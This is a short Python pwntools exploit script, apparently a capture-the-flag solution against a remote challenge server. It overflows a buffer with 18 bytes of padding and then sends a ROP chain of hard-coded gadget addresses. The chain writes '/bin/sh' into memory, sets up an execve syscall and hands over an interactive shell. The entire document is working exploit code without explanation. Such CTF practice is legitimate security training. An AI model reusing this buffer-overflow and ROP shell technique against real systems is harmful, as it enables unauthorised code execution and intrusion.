import pwn

#p = pwn.gdb.debug('./static')
p = pwn.remote("static.chal.cyberjousting.com", 1350)

pop_rdi = 0x0000000000401fe0
pop_rsi = 0x00000000004062d8
pop_rax = 0x000000000041069c
mov_eax_edx = 0x000000000040f0bd
syscall =  0x0000000000401194
mov_edx_ebp_syscall = 0x000000000042fac8
pop_rbp_ret = 0x0000000000401761
mov_into_rdi_rcx = 0x000000000045a166
mov_rcx_rax = 0x0000000000404606

binsh_tar = 0x000000004a0000
chain = pwn.p64(pop_rdi) + pwn.p64(binsh_tar) + \
        pwn.p64(pop_rsi) + pwn.p64(0) + \
        pwn.p64(pop_rax) + "/bin/sh\x00".encode() + \
        pwn.p64(mov_rcx_rax) + pwn.p64(mov_into_rdi_rcx) + \
        pwn.p64(pop_rax) + pwn.p64(0x3b) + \
        pwn.p64(pop_rbp_ret) + pwn.p64(0) + \
        pwn.p64(mov_edx_ebp_syscall)

chain = 18 * b'A' + chain
p.sendline(chain)
p.interactive()
